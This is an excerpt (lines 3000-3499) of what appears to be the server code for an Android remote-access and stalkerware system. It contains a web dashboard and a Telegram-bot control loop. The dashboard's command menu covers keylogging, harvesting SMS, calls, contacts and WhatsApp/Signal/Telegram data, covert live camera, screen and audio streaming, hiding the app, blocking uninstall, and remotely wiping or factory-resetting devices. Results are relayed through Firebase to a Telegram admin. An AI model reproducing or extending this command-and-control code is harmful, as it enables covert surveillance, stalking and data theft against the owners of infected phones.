@@ -1,0 +1,502 @@
+  3000→const u=document.getElementById('loginUser').value;
+  3001→const p=document.getElementById('loginPass').value;
+  3002→const r=await api('login',{method:'POST',body:JSON.stringify({username:u,password:p})});
+  3003→if(r.ok){TOKEN=r.token;localStorage.setItem('az_token',TOKEN);showApp();}
+  3004→else{document.getElementById('loginError').style.display='block';}
+  3005→}
+  3006→
+  3007→function doLogout(){
+  3008→TOKEN='';localStorage.removeItem('az_token');
+  3009→document.getElementById('app').style.display='none';
+  3010→document.getElementById('loginPage').style.display='flex';
+  3011→if(POLL_INTERVAL)clearInterval(POLL_INTERVAL);
+  3012→}
+  3013→
+  3014→function showApp(){
+  3015→document.getElementById('loginPage').style.display='none';
+  3016→document.getElementById('app').style.display='block';
+  3017→loadAll();
+  3018→POLL_INTERVAL=setInterval(loadAll,5000);
+  3019→}
+  3020→
+  3021→function toggleSidebar(){document.getElementById('sidebar').classList.toggle('open');}
+  3022→
+  3023→function showPage(name){
+  3024→document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  3025→document.getElementById('page-'+name).classList.add('active');
+  3026→document.querySelectorAll('.sidebar a').forEach(a=>a.classList.remove('active'));
+  3027→event.target.classList.add('active');
+  3028→document.getElementById('sidebar').classList.remove('open');
+  3029→}
+  3030→
+  3031→function updateClock(){
+  3032→const now=new Date();
+  3033→document.getElementById('clock').textContent=now.toLocaleString('en-US');
+  3034→}
+  3035→setInterval(updateClock,1000);updateClock();
+  3036→
+  3037→function populateDeviceSelects(){
+  3038→const html=DEVICES.map(d=>`<option value="${d.id}">${d.name||d.id} (${d.active?'🟢':'🔴'})</option>`).join('');
+  3039→['cmdDevice','fileDevice','dataDevice','monDevice'].forEach(id=>{
+  3040→const el=document.getElementById(id);if(el)el.innerHTML=html;
+  3041→});
+  3042→}
+  3043→
+  3044→async function loadAll(){
+  3045→try{const r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
+  3046→try{const r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();}}catch(e){}
+  3047→try{const r=await api('web/commands');if(r.ok)renderCommandLog(r.commands);}catch(e){}
+  3048→}
+  3049→
+  3050→function renderStats(s){
+  3051→const grid=document.getElementById('statsGrid');
+  3052→grid.innerHTML=`
+  3053→<div class="stat-card"><div class="label">⏱ Uptime</div><div class="value">${s.uptime_formatted||'-'}</div></div>
+  3054→<div class="stat-card"><div class="label">📱 Devices</div><div class="value" style="color:var(--blue)">${s.devices_total}</div><div class="sub">🟢 ${s.devices_online} online</div></div>
+  3055→<div class="stat-card"><div class="label">📋 Commands</div><div class="value" style="color:var(--yellow)">${s.total_registered_commands}</div><div class="sub">⏳ ${s.commands_pending} pending</div></div>
+  3056→<div class="stat-card"><div class="label">📨 Messages</div><div class="value" style="color:var(--purple)">${s.messages_sent}</div></div>
+  3057→<div class="stat-card"><div class="label">📡 API</div><div class="value">${s.api_hits}</div><div class="sub">hits</div></div>
+  3058→<div class="stat-card"><div class="label">✅ Completed</div><div class="value" style="color:var(--green)">${s.commands_completed}</div></div>`;
+  3059→}
+  3060→
+  3061→function renderDevices(){
+  3062→const el=document.getElementById('deviceList');
+  3063→const dash=document.getElementById('dashDevices');
+  3064→if(!DEVICES.length){
+  3065→el.innerHTML='<div class="empty">No devices linked</div>';
+  3066→dash.innerHTML='<div class="empty">No devices</div>';
+  3067→return;
+  3068→}
+  3069→const card=d=>`
+  3070→<div class="device-card" onclick="showDeviceDetail('${d.id}')">
+  3071→<div class="name">${d.active?'🟢':'🔴'} ${d.name||d.id}</div>
+  3072→<div class="meta">Model: ${d.model||'-'} | OS: ${d.os||'-'}</div>
+  3073→<div class="meta">Battery: ${d.battery||'-'}% | Last: ${d.last_seen||'-'}</div>
+  3074→</div>`;
+  3075→el.innerHTML=DEVICES.map(card).join('');
+  3076→dash.innerHTML=DEVICES.slice(0,4).map(card).join('');
+  3077→}
+  3078→
+  3079→async function showDeviceDetail(id){
+  3080→try{
+  3081→const r=await api('web/device/'+id);
+  3082→if(!r.ok)return;
+  3083→const d=r.device;const cmds=r.commands||[];
+  3084→const detail=document.getElementById('deviceDetail');
+  3085→detail.style.display='block';
+  3086→detail.innerHTML=`
+  3087→<h2>📱 ${d.name||d.id}</h2>
+  3088→<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0">
+  3089→<div><span style="color:var(--text2)">ID:</span> <code>${d.id}</code></div>
+  3090→<div><span style="color:var(--text2)">Status:</span> ${d.active?'<span class="badge badge-green">Online</span>':'<span class="badge badge-red">Offline</span>'}</div>
+  3091→<div><span style="color:var(--text2)">Model:</span> ${d.model||'-'}</div>
+  3092→<div><span style="color:var(--text2)">OS:</span> ${d.os||'-'}</div>
+  3093→<div><span style="color:var(--text2)">Battery:</span> ${d.battery||'-'}%</div>
+  3094→<div><span style="color:var(--text2)">Network:</span> ${d.network||'-'}</div>
+  3095→<div><span style="color:var(--text2)">Location:</span> ${d.location||'-'}</div>
+  3096→<div><span style="color:var(--text2)">Last Seen:</span> ${d.last_seen||'-'}</div>
+  3097→</div>
+  3098→<h3>📋 Recent Commands</h3>
+  3099→${cmds.length?cmds.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">${c.created_at} | ID: ${c.id}</div></div>`).join(''):'<div class="empty">No commands</div>'}
+  3100→<button class="btn btn-danger btn-sm" onclick="unlinkDevice('${d.id}')" style="margin-top:16px">🗑️ Unlink Device</button>`;
+  3101→detail.scrollIntoView({behavior:'smooth'});
+  3102→}catch(e){}
+  3103→}
+  3104→
+  3105→async function unlinkDevice(id){
+  3106→if(!confirm('Unlink this device?'))return;
+  3107→const r=await api('web/unlink/'+id,{method:'DELETE'});
+  3108→if(r.ok){notify('Device unlinked');loadAll();}
+  3109→else notify('Failed','var(--accent)');
+  3110→}
+  3111→
+  3112→async function generateLink(){
+  3113→const r=await api('web/link_code');
+  3114→if(r.ok){
+  3115→const box=document.getElementById('linkCodeBox');
+  3116→document.getElementById('linkCodeText').textContent=r.code;
+  3117→box.style.display='block';
+  3118→notify('Link code generated!');
+  3119→}
+  3120→}
+  3121→
+  3122→const CMD_CATEGORIES={
+  3123→data:{label:'📊 Data',cmds:['sms','calls','contacts','location','notifications','apps','info','battery','gallery','clipboard','all_data','wifi_info','bluetooth_devices','network_info','sim_info','storage_info','installed_apps','running_apps','calendar','browser_history']},
+  3124→social:{label:'🌐 Social',cmds:['whatsapp','telegram_app','instagram','messenger','snapchat','tiktok','twitter','viber','signal','facebook','whatsapp_status','whatsapp_stories','telegram_channels','instagram_stories','youtube']},
+  3125→control:{label:'🎮 Control',cmds:['ping','vibrate','ring','screenshot','front_camera','back_camera','record_audio','record_video','lock_phone','unlock_phone','reboot','shutdown','set_volume','set_brightness','enable_wifi','disable_wifi','enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data','enable_hotspot','disable_hotspot','airplane_on','airplane_off','torch_on','torch_off','play_sound','speak_text','open_url','send_sms','make_call','block_number','unblock_number']},
+  3126→apps:{label:'📦 Apps',cmds:['open_app','close_app','install_app','uninstall_app','block_app','unblock_app','clear_app_data','force_stop_app','app_info','app_usage','screen_time','app_permissions','enable_app','disable_app','list_blocked','clear_cache','update_app','launch_app','kill_app','app_cache']},
+  3127→files:{label:'📂 Files',cmds:['list_files','get_file','download_file','list_downloads','list_dcim','list_music','list_videos','list_documents','list_whatsapp','list_telegram_files','send_contacts_backup','send_sms_backup','send_calls_backup','send_full_backup','delete_file','rename_file','copy_file','move_file','create_folder','search_files','recent_files','file_info','zip_files']},
+  3128→security:{label:'🔒 Security',cmds:['wipe_data','factory_reset','show_app','hide_app','change_passcode','set_pin','remove_pin','enable_biometric','disable_biometric','anti_uninstall_on','anti_uninstall_off','device_admin_status','check_root','set_screen_lock','remove_screen_lock']},
+  3129→monitor:{label:'🔍 Monitor',cmds:['keylogger_start','keylogger_stop','get_keylogger','screen_record_start','screen_record_stop','clipboard_monitor_start','clipboard_monitor_stop','get_clipboard_log','wifi_monitor_start','wifi_monitor_stop','app_monitor_start','app_monitor_stop','get_app_log','location_live','location_stop','location_history','geo_add','geo_remove','geo_list','sms_monitor','call_monitor']},
+  3130→syssettings:{label:'⚙️ System',cmds:['set_language','set_timezone','set_alarm','set_timer','set_reminder','enable_dev_mode','disable_dev_mode','enable_usb_debug','disable_usb_debug','dns_change','proxy_set','apn_settings','nfc_on','nfc_off','auto_update_on','auto_update_off']}
+  3131→};
+  3132→
+  3133→function initCmdTabs(){
+  3134→const tabs=document.getElementById('cmdTabs');
+  3135→tabs.innerHTML=Object.keys(CMD_CATEGORIES).map(k=>`<button class="tab${k==='data'?' active':''}" onclick="showCmdCat('${k}',this)">${CMD_CATEGORIES[k].label}</button>`).join('');
+  3136→showCmdCat('data');
+  3137→}
+  3138→
+  3139→function showCmdCat(cat,btn){
+  3140→if(btn){document.querySelectorAll('#cmdTabs .tab').forEach(t=>t.classList.remove('active'));btn.classList.add('active');}
+  3141→const grid=document.getElementById('cmdGrid');
+  3142→grid.innerHTML=CMD_CATEGORIES[cat].cmds.map(c=>`<button class="cmd-btn" onclick="sendDeviceCmd('${c}')">${c.replace(/_/g,' ')}</button>`).join('');
+  3143→}
+  3144→
+  3145→async function sendDeviceCmd(cmd){
+  3146→const devId=document.getElementById('cmdDevice').value;
+  3147→if(!devId){notify('Select a device','var(--accent)');return;}
+  3148→const r=await api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})});
+  3149→if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
+  3150→loadAll();
+  3151→}
+  3152→
+  3153→function sendCmd(cmd){
+  3154→const devId=document.getElementById('fileDevice').value;
+  3155→if(!devId){notify('Select a device','var(--accent)');return;}
+  3156→api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
+  3157→if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
+  3158→});
+  3159→}
+  3160→function sendDataCmd(cmd){
+  3161→const devId=document.getElementById('dataDevice').value;
+  3162→if(!devId){notify('Select a device','var(--accent)');return;}
+  3163→api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:'get_'+cmd})}).then(r=>{
+  3164→if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
+  3165→});
+  3166→}
+  3167→function sendMonCmd(cmd){
+  3168→const devId=document.getElementById('monDevice').value;
+  3169→if(!devId){notify('Select a device','var(--accent)');return;}
+  3170→api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
+  3171→if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
+  3172→});
+  3173→}
+  3174→
+  3175→function renderCommandLog(cmds){
+  3176→const el=document.getElementById('cmdLog');
+  3177→const dash=document.getElementById('dashCommands');
+  3178→const items=(cmds||[]).slice(-20).reverse();
+  3179→if(!items.length){el.innerHTML='<div class="empty">No commands</div>';dash.innerHTML='';return;}
+  3180→const html=items.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">Device: ${c.device_id} | ${c.created_at}</div></div>`).join('');
+  3181→el.innerHTML=html;
+  3182→dash.innerHTML=html;
+  3183→}
+  3184→
+  3185→async function loadEvents(){
+  3186→const r=await api('web/events');
+  3187→if(r.ok){
+  3188→const el=document.getElementById('eventLog');
+  3189→el.innerHTML=(r.events||[]).slice(-50).reverse().map(e=>`<div class="log-item"><span class="time">${(e.time||'').slice(0,19)}</span><span class="event">${e.event} ${e.details?JSON.stringify(e.details).slice(0,60):''}</span></div>`).join('')||'<div class="empty">No events</div>';
+  3190→}
+  3191→}
+  3192→
+  3193→async function loadSettings(){
+  3194→const r=await api('web/settings');
+  3195→if(r.ok){
+  3196→const s=r.settings;
+  3197→document.getElementById('settingsForm').innerHTML=`
+  3198→<label style="display:block;margin-bottom:12px">🔑 Admin Password<input id="setPass" value="${s.admin_password||'admin'}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
+  3199→<label style="display:block;margin-bottom:12px">⏱️ Sync Interval (sec)<input id="setSync" type="number" value="${s.sync_interval||300}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
+  3200→<label style="display:block;margin-bottom:12px">📍 Location Interval (sec)<input id="setLoc" type="number" value="${s.location_interval||60}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
+  3201→<label style="display:block;margin-bottom:12px">🌐 Language<select id="setLang" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"><option value="ar" ${s.language==='ar'?'selected':''}>Arabic</option><option value="en" ${s.language==='en'?'selected':''}>English</option></select></label>
+  3202→<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setNotif" ${s.notifications?'checked':''}> 🔔 Notifications</label>
+  3203→<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoLoc" ${s.auto_location?'checked':''}> 🗺️ Auto Location</label>
+  3204→<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoSync" ${s.auto_sync?'checked':''}> 🔄 Auto Sync</label>`;
+  3205→}
+  3206→}
+  3207→
+  3208→async function saveSettings(){
+  3209→const data={
+  3210→admin_password:document.getElementById('setPass').value,
+  3211→sync_interval:parseInt(document.getElementById('setSync').value),
+  3212→location_interval:parseInt(document.getElementById('setLoc').value),
+  3213→language:document.getElementById('setLang').value,
+  3214→notifications:document.getElementById('setNotif').checked,
+  3215→auto_location:document.getElementById('setAutoLoc').checked,
+  3216→auto_sync:document.getElementById('setAutoSync').checked,
+  3217→};
+  3218→const r=await api('web/settings',{method:'PUT',body:JSON.stringify(data)});
+  3219→if(r.ok)notify('Settings saved!');else notify('Failed','var(--accent)');
+  3220→}
+  3221→
+  3222→if(TOKEN){showApp();}
+  3223→initCmdTabs();
+  3224→setTimeout(loadSettings,500);
+  3225→
+  3226→// ========== LIVE STREAMING (JPEG Screenshot-based) ==========
+  3227→let _streamType='screen';
+  3228→let _streamActive=false;
+  3229→let _streamPollTimer=null;
+  3230→let _frameCount=0;
+  3231→let _audioAnimFrame=null;
+  3232→let _streamWaitingTimer=null;
+  3233→let _firstFrameReceived=false;
+  3234→let _lastFrameData='';
+  3235→
+  3236→function populateStreamDeviceSelect(){
+  3237→const html=DEVICES.map(d=>'<option value="'+d.id+'">'+(d.name||d.id)+' ('+(d.active?'&#x1F7E2;':'&#x1F534;')+')</option>').join('');
+  3238→const el=document.getElementById('streamDevice');if(el)el.innerHTML=html;
+  3239→}
+  3240→const _origPopulate=populateDeviceSelects;
+  3241→populateDeviceSelects=function(){
+  3242→_origPopulate();populateStreamDeviceSelect();
+  3243→};
+  3244→
+  3245→function onStreamDeviceChange(){
+  3246→const devId=document.getElementById('streamDevice').value;
+  3247→document.getElementById('stDevice').textContent=devId?((DEVICES.find(function(d){return d.id===devId;})||{}).name||devId):'-';
+  3248→if(_streamActive)stopStream();
+  3249→}
+  3250→
+  3251→function selectStreamType(type){
+  3252→_streamType=type;
+  3253→document.querySelectorAll('.stream-type-btn').forEach(function(b){b.classList.remove('active');});
+  3254→var btnId=type==='screen'?'stScreen':type==='camera'?'stCamera':'stAudio';
+  3255→document.getElementById(btnId).classList.add('active');
+  3256→document.getElementById('qualityCard').style.display=type==='audio'?'none':'block';
+  3257→}
+  3258→
+  3259→function setQuality(q,btn){
+  3260→document.querySelectorAll('.stream-quality button').forEach(function(b){b.classList.remove('active');});
+  3261→btn.classList.add('active');
+  3262→notify('تم تغيير الجودة');
+  3263→}
+  3264→
+  3265→function _setViewerState(state){
+  3266→var viewer=document.getElementById('streamViewer');
+  3267→var noMsg=document.getElementById('noStreamMsg');
+  3268→var img=document.getElementById('streamImg');
+  3269→var badge=document.getElementById('streamBadge');
+  3270→var audioC=document.getElementById('audioPlayerContainer');
+  3271→noMsg.style.display='none';img.style.display='none';badge.style.display='none';audioC.style.display='none';viewer.style.background='#000';
+  3272→if(state==='idle'){noMsg.style.display='';noMsg.innerHTML='<div style="font-size:48px;margin-bottom:12px">&#x1F4E1;</div>اختر جهازاً وابدأ البث المباشر';viewer.style.background='var(--surface)';}
+  3273→else if(state==='waiting'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div class="pulse" style="font-size:48px;margin-bottom:16px">&#x231B;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px">جاري انتظار الصورة من الجهاز...</div><div style="color:var(--text2);font-size:13px">يتم إرسال أمر لقطة الشاشة للجهاز.<br>قد يستغرق الأمر بضع ثوانٍ للإطار الأول.<br>تأكد أن الجهاز متصل بالإنترنت وأن إذن التقاط الشاشة ممنوحة.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--yellow)">● انتظار...</span>';}
+  3274→else if(state==='connected'){document.getElementById('stStatus').innerHTML='<span style="color:var(--blue)">● متصل - ينتظر إطار...</span>';}
+  3275→else if(state==='receiving_video'){img.style.display='';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">● مباشر</span>';}
+  3276→else if(state==='receiving_audio'){audioC.style.display='block';badge.style.display='';badge.className='stream-badge live';noMsg.style.display='none';document.getElementById('stStatus').innerHTML='<span style="color:var(--green)">● مباشر</span>';}
+  3277→else if(state==='error'){noMsg.style.display='';noMsg.innerHTML='<div style="text-align:center"><div style="font-size:48px;margin-bottom:16px">&#x26A0;&#xFE0F;</div><div style="font-size:16px;font-weight:600;margin-bottom:8px;color:var(--accent)">لم يتم استلام البث</div><div style="color:var(--text2);font-size:13px">تأكد أن الجهاز متصل ويمكنه تنفيذ أمر لقطة الشاشة.<br>تأكد من منح إذن التقاط الشاشة في تطبيق الجهاز.<br>حاول مرة أخرى.</div></div>';document.getElementById('stStatus').innerHTML='<span style="color:var(--accent)">● فشل</span>';}
+  3278→}
+  3279→
+  3280→async function startStream(){
+  3281→var devId=document.getElementById('streamDevice').value;
+  3282→if(!devId){notify('اختر جهازاً أولاً','var(--accent)');return;}
+  3283→_streamActive=true;_frameCount=0;_firstFrameReceived=false;_lastFrameData='';
+  3284→document.getElementById('btnStartStream').style.display='none';
+  3285→document.getElementById('btnStopStream').style.display='';
+  3286→document.getElementById('btnSwitchCam').style.display=_streamType==='camera'?'':'none';
+  3287→document.getElementById('stFrames').textContent='0';
+  3288→document.getElementById('stLastAct').textContent='-';
+  3289→var typeLabel=_streamType==='screen'?'الشاشة':_streamType==='camera'?'الكاميرا':'الصوت';
+  3290→document.getElementById('stType').textContent=typeLabel;
+  3291→var dev=DEVICES.find(function(d){return d.id===devId;});
+  3292→document.getElementById('stDevice').textContent=(dev&&dev.name)||devId;
+  3293→_setViewerState('waiting');
+  3294→notify('جاري بدء البث: '+typeLabel);
+  3295→var interval=_streamType==='audio'?5:3;
+  3296→var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:_streamType,interval:interval})});
+  3297→if(!r.ok){notify('فشل بدء البث: '+(r.error||''),'var(--accent)');_setViewerState('error');_streamActive=false;document.getElementById('btnStartStream').style.display='';document.getElementById('btnStopStream').style.display='none';return;}
+  3298→notify('تم بدء البث - بانتظار الإطار الأول...');
+  3299→startStreamPolling(devId);
+  3300→if(_streamWaitingTimer)clearTimeout(_streamWaitingTimer);
+  3301→_streamWaitingTimer=setTimeout(function(){if(_streamActive&&!_firstFrameReceived){_setViewerState('error');}},60000);
+  3302→}
+  3303→
+  3304→async function stopStream(){
+  3305→var devId=document.getElementById('streamDevice').value;
+  3306→if(!devId)return;
+  3307→api('stream/jpeg_stop',{method:'POST',body:JSON.stringify({device_id:devId})});
+  3308→_cleanupStream();
+  3309→notify('تم إيقاف البث');
+  3310→}
+  3311→
+  3312→function _cleanupStream(){
+  3313→_streamActive=false;_firstFrameReceived=false;_lastFrameData='';
+  3314→if(_streamPollTimer){clearInterval(_streamPollTimer);_streamPollTimer=null;}
+  3315→if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}
+  3316→if(_audioAnimFrame){cancelAnimationFrame(_audioAnimFrame);_audioAnimFrame=null;}
+  3317→document.getElementById('btnStartStream').style.display='';
+  3318→document.getElementById('btnStopStream').style.display='none';
+  3319→document.getElementById('btnSwitchCam').style.display='none';
+  3320→_setViewerState('idle');
+  3321→document.getElementById('stStatus').textContent='متوقف';
+  3322→}
+  3323→
+  3324→async function switchCamera(){
+  3325→var devId=document.getElementById('streamDevice').value;
+  3326→if(!devId)return;
+  3327→await api('stream/jpeg_stop',{method:'POST',body:JSON.stringify({device_id:devId})});
+  3328→_streamType='camera';
+  3329→var r=await api('stream/jpeg_start',{method:'POST',body:JSON.stringify({device_id:devId,type:'camera',interval:3})});
+  3330→if(r.ok){_streamActive=true;_firstFrameReceived=false;_setViewerState('waiting');startStreamPolling(devId);}
+  3331→notify('تم تبديل الكاميرا');
+  3332→}
+  3333→
+  3334→function _onFrameReceived(base64Data,isAudio){
+  3335→if(base64Data===_lastFrameData)return;
+  3336→_lastFrameData=base64Data;
+  3337→if(!_firstFrameReceived){_firstFrameReceived=true;if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}}
+  3338→_frameCount++;
+  3339→document.getElementById('stFrames').textContent=_frameCount;
+  3340→document.getElementById('stLastAct').textContent=new Date().toLocaleTimeString();
+  3341→if(isAudio){_setViewerState('receiving_audio');}
+  3342→else{_setViewerState('receiving_video');document.getElementById('streamImg').src='data:image/jpeg;base64,'+base64Data;}
+  3343→}
+  3344→
+  3345→function startStreamPolling(devId){
+  3346→if(_streamPollTimer)clearInterval(_streamPollTimer);
+  3347→_streamPollTimer=setInterval(async function(){
+  3348→if(!_streamActive)return;
+  3349→try{
+  3350→var typeParam=_streamType==='audio'?'audio':'video';
+  3351→var resp=await fetch('/api/stream/frame/'+devId+'?type='+typeParam);
+  3352→var r=await resp.json();
+  3353→if(r.ok&&r.data&&r.data.length>50){_onFrameReceived(r.data,false);}
+  3354→else if(r.ok&&_firstFrameReceived){}
+  3355→else if(!_firstFrameReceived){
+  3356→try{var sr=await fetch('/api/stream/status');var status=await sr.json();if(status.ok&&status.active_streams&&status.active_streams[devId]){if(!_firstFrameReceived)_setViewerState('connected');}else if(!_firstFrameReceived&&_streamActive){_setViewerState('waiting');}}catch(e){}
+  3357→}
+  3358→}catch(e){}
+  3359→},2000);
+  3360→}
+  3361→
+  3362→// Add streaming category to commands
+  3363→if(typeof CMD_CATEGORIES!=='undefined'){
+  3364→CMD_CATEGORIES.streaming={label:'📡 Streaming',cmds:['start_screen_stream','stop_screen_stream','start_camera_stream','stop_camera_stream','switch_camera','start_audio_stream','stop_audio_stream','get_stream_status','set_stream_quality','enable_torch','pause_stream','resume_stream','stop_all_streams','get_stream_capabilities']};
+  3365→if(document.getElementById('cmdTabs')){
+  3366→var tabs=document.getElementById('cmdTabs');
+  3367→if(tabs.innerHTML.indexOf('Streaming')===-1){
+  3368→tabs.innerHTML+='<button class="tab" onclick="showCmdCat(\'streaming\',this)">📡 Streaming</button>';
+  3369→}
+  3370→}
+  3371→}
+  3372→</script>
+  3373→</body>
+  3374→</html>"""
+  3375→
+  3376→# ============================================================================
+  3377→# WEB DASHBOARD ROUTE
+  3378→# ============================================================================
+  3379→
+  3380→async def serve_dashboard(request):
+  3381→    return web.Response(text=DASHBOARD_HTML, content_type="text/html", charset="utf-8")
+  3382→
+  3383→# ============================================================================
+  3384→# GETUPDATES POLLING
+  3385→# ============================================================================
+  3386→
+  3387→async def tg_poll_loop():
+  3388→    global tg_offset, polling_active, _processed_update_ids, _processed_message_keys
+  3389→    polling_active = True
+  3390→    
+  3391→    # === تنظيف الاتصالات القديمة عند بدء التشغيل ===
+  3392→    log.info("Cleaning old connections (deleteWebhook)...")
+  3393→    try:
+  3394→        session = get_tg_session()
+  3395→        # حذف webhook وتجاهل التحديثات المعلقة
+  3396→        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true") as resp:
+  3397→            r = await resp.json()
+  3398→            log.info("deleteWebhook: %s", r.get("description", r.get("ok")))
+  3399→        await asyncio.sleep(1)
+  3400→        # التحقق من البوت
+  3401→        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe") as resp:
+  3402→            me = await resp.json()
+  3403→            if me.get("ok"):
+  3404→                log.info("Bot connected: @%s (%s)", me["result"].get("username", "?"), me["result"].get("first_name", "?"))
+  3405→            else:
+  3406→                log.warning("getMe failed: %s", me)
+  3407→        await asyncio.sleep(1)
+  3408→    except Exception as exc:
+  3409→        log.warning("Connection cleanup: %s", exc)
+  3410→    
+  3411→    log.info("Starting Telegram getUpdates polling...")
+  3412→    
+  3413→    _conflict_count = 0
+  3414→    while polling_active:
+  3415→        try:
+  3416→            payload = {
+  3417→                "offset": tg_offset,
+  3418→                "timeout": 30,
+  3419→                "allowed_updates": ["message", "callback_query"],
+  3420→            }
+  3421→            result = await tg_request("getUpdates", payload)
+  3422→            if not result or not result.get("ok"):
+  3423→                desc = (result or {}).get("description", "")
+  3424→                if "Conflict" in desc:
+  3425→                    _conflict_count += 1
+  3426→                    log.warning("Conflict detected (%d), waiting...", _conflict_count)
+  3427→                    await asyncio.sleep(8)
+  3428→                else:
+  3429→                    await asyncio.sleep(2)
+  3430→                continue
+  3431→            _conflict_count = 0  # إعادة العداد عند النجاح
+  3432→            
+  3433→            updates = result.get("result", [])
+  3434→            for update in updates:
+  3435→                update_id = update.get("update_id", 0)
+  3436→                tg_offset = update_id + 1
+  3437→                
+  3438→                # === منع تكرار معالجة نفس التحديث ===
+  3439→                if update_id in _processed_update_ids:
+  3440→                    continue
+  3441→                _processed_update_ids.add(update_id)
+  3442→                if len(_processed_update_ids) > 1000:
+  3443→                    _processed_update_ids = set(list(_processed_update_ids)[-500:])
+  3444→                
+  3445→                # Handle message
+  3446→                if "message" in update:
+  3447→                    msg = update["message"]
+  3448→                    chat_id = msg.get("chat", {}).get("id")
+  3449→                    text = msg.get("text", "")
+  3450→                    msg_id = msg.get("message_id", 0)
+  3451→                    
+  3452→                    # === منع تكرار معالجة نفس الرسالة بالضبط ===
+  3453→                    msg_key = f"{chat_id}:{msg_id}"
+  3454→                    if msg_key in _processed_message_keys:
+  3455→                        continue
+  3456→                    _processed_message_keys.add(msg_key)
+  3457→                    if len(_processed_message_keys) > 500:
+  3458→                        _processed_message_keys = set(list(_processed_message_keys)[-200:])
+  3459→                    
+  3460→                    if chat_id != ADMIN_CHAT_ID:
+  3461→                        log.warning("Unauthorized access from %s", chat_id)
+  3462→                        continue
+  3463→                    
+  3464→                    if text.startswith("/"):
+  3465→                        await handle_telegram_command(chat_id, text, msg_id)
+  3466→                
+  3467→                # Handle callback query
+  3468→                if "callback_query" in update:
+  3469→                    cb = update["callback_query"]
+  3470→                    cb_id = cb.get("id", "")
+  3471→                    cb_chat = cb.get("message", {}).get("chat", {}).get("id")
+  3472→                    
+  3473→                    # === منع تكرار معالجة نفس الـ callback ===
+  3474→                    cb_key = f"cb:{cb_id}"
+  3475→                    if cb_key in _processed_message_keys:
+  3476→                        continue
+  3477→                    _processed_message_keys.add(cb_key)
+  3478→                    
+  3479→                    if cb_chat != ADMIN_CHAT_ID:
+  3480→                        continue
+  3481→                    await handle_callback_query(cb)
+  3482→        
+  3483→        except asyncio.CancelledError:
+  3484→            break
+  3485→        except Exception as exc:
+  3486→            log.error("Poll error: %s", exc)
+  3487→            await asyncio.sleep(3)
+  3488→
+  3489→# ============================================================================
+  3490→# FIREBASE COMMAND RESULT LISTENER
+  3491→# ============================================================================
+  3492→
+  3493→async def firebase_result_listener():
+  3494→    """Background task: Poll Firebase for results from Android app.
+  3495→    ACTIVE mode - forwards results to Telegram admin."""
+  3496→    global _processed_results
+  3497→    log.info("Firebase result listener started (ACTIVE mode)")
+  3498→
+  3499→    # Clean ALL old results AND commands on startup to prevent re-processing spam
+
+[showing lines 3000-3499 of 4290; use offset=3500 with limit to continue reading]
